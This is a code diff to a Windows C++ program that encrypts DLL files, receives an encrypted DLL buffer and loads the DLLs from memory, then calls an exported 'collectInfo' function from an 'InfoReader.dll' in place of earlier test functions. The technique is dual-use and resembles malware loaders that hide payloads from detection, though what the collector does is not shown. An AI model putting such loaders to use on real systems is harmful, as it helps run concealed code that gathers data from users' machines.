@@ -1,17 +1,24 @@
 #include "loader.h"
 #include "SimpleCrytProtocol.h"
+#include "Encrypter.h"
+#include "getEncryptedDll.h"
 using namespace std;
 
 string outputPath = ".\\output";
 string outputFilename = "encrypted";
 fs::path outputFileFullPath = outputPath + "\\" + outputFilename;
+fs::path recvFileFullPath = outputPath + "\\" + "recv_" + outputFilename;
 
 void dlltest()
 {
 
-    LoadLibrary("C:\\Users\\Administrator\\source\\repos\\testDlll\\Release\\testDlll.dll");
-    LoadLibrary("C:\\Users\\Administrator\\source\\repos\\test2\\Release\\test2.dll");
-    auto hd = LoadLibrary("C:\\Users\\Administrator\\source\\repos\\dll3\\Release\\dll3.dll");
+ //    LoadLibrary("C:\\Users\\Administrator\\source\\repos\\testDlll\\Release\\testDlll.dll");
+    // LoadLibrary("C:\\Users\\Administrator\\source\\repos\\test2\\Release\\test2.dll");
+     auto hd = LoadLibrary("C:\\Users\\Administrator\\source\\repos\\InfoReader\\Debug\\InfoReader.dll");
+  //   LoadLibrary("C:\\Users\\Administrator\\source\\repos\\dll3\\Release\\dll3.dll");
+
+  //  FreeLibrary(hd);
+  //  FreeLibrary(hd);
     if (hd == NULL)
     {
         int errCode = GetLastError();
@@ -19,10 +26,10 @@ void dlltest()
         FreeLibrary(hd);
         return;
     }
-    typedef void(*FUN)(int a, int b);
-    FUN f = (FUN)GetProcAddress(hd, (char *)"printAddTwice");
+    typedef void(*FUN)();
+    FUN f = (FUN)GetProcAddress(hd, (char *)"collectInfo");
     if (f != nullptr)
-        f(1, 1);
+        f();
     FreeLibrary(hd);
     return;
 }
@@ -33,36 +40,36 @@ void encrypt(Encrypter cp)
     fileNames.push_back("C:\\Users\\Administrator\\source\\repos\\dll3\\Release\\dll3.dll");
     fileNames.push_back("C:\\Users\\Administrator\\source\\repos\\testDlll\\Release\\testDlll.dll");
     fileNames.push_back("C:\\Users\\Administrator\\source\\repos\\test2\\Release\\test2.dll");
+    fileNames.push_back("C:\\Users\\Administrator\\source\\repos\\infoReader\\Debug\\infoReader.dll");
 
     cp.encryptFiles(fileNames, outputFileFullPath);
 }
 
 int main()
 {
-    // dlltest();
+ //   dlltest();
     // CryptProtocol prot;
     SimpleCryptProtocol prot;
     Encrypter cp(&prot);
     encrypt(cp);
+    auto fileBuf = getEncryptedDll();
+    istream recvdFile(fileBuf.get());
 
     Loader loader(cp);
-    loader.loadEncryptedDlls(outputFileFullPath);
+    loader.loadEncryptedDlls(recvdFile);
+    // loader.loadEncryptedDlls(recvFileFullPath);
 
-    // auto moudleInfo1 = loader.dllMap["testDlll.dll"];
-    auto moudleInfo2 = loader.dllMap["test2.dll"];
-    auto moudleInfo3 = loader.dllMap["dll3.dll"];
+    auto moudleInfo = loader.dllMap["inforeader.dll"];
+    auto dll3Info = loader.dllMap["dll3.dll"];
 
-    typedef void (*FUN)(int, int);
-    // FUN fun1 = reinterpret_cast<FUN>(loader.getFuntionByName(moudleInfo1, "msgBox"));
-    FUN printAdd = reinterpret_cast<FUN>(loader.getFuntionByName(moudleInfo2, "printAdd"));
-    FUN printAddTwice = reinterpret_cast<FUN>(loader.getFuntionByName(moudleInfo3, "printAddTwice"));
+    typedef void (*FUN)();
 
-    // if (fun1 != nullptr)
-    //     fun1();
-    if (printAdd != nullptr)
-        printAdd(33,55);
-    if (printAddTwice != nullptr)
-        printAddTwice(33,55);
+    FUN cInfo = reinterpret_cast<FUN>(loader.getFuntionByName(moudleInfo, "collectInfo"));
+    // if (test != nullptr)
+    //     test();
+
+    if (cInfo != nullptr)
+        cInfo();
 
     // loader.unloadMoudle(moudleInfo1);
     // loader.unloadMoudle(moudleInfo2);
